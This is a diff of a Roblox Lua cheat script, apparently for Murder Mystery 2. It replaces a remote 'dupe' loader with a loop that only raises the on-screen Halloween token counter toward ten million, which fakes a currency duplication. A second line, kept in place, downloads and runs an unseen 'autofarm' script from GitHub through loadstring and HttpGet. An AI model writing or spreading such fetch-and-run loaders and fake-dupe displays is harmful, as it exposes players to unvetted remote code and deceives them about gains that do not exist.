@@ -1,3 +1,34 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/dupecoiinevevnt/refs/heads/main/aaaaaaaa", true))()
+-- Referência ao Player
+local player = game.Players.LocalPlayer
+
+-- Referência ao TextLabel dentro da PlayerGui do jogador
+local textLabel = player.PlayerGui.CrossPlatform.Halloween2024.Container.EventFrames.BattlePass.Info.Tokens.Container.TextLabel
+
+-- Definir o valor inicial
+local currentValue = 0
+
+-- Definir o valor máximo
+local maxValue = 10000000
+
+-- Definir o incremento
+local increment = 3
+
+-- Função para aumentar o valor do TextLabel
+local function increaseValue()
+    -- Loop até atingir o valor máximo
+    while currentValue < maxValue do
+        -- Incrementa o valor atual
+        currentValue = currentValue + increment
+        
+        -- Atualiza o TextLabel
+        textLabel.Text = tostring(currentValue)
+        
+        -- Espera um curto intervalo de tempo (ajustável)
+        wait(0.1)
+    end
+end
+
+-- Iniciar a função
+increaseValue()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/Fastestmm2autofarm/refs/heads/main/FastestMM2autofarm", true))()
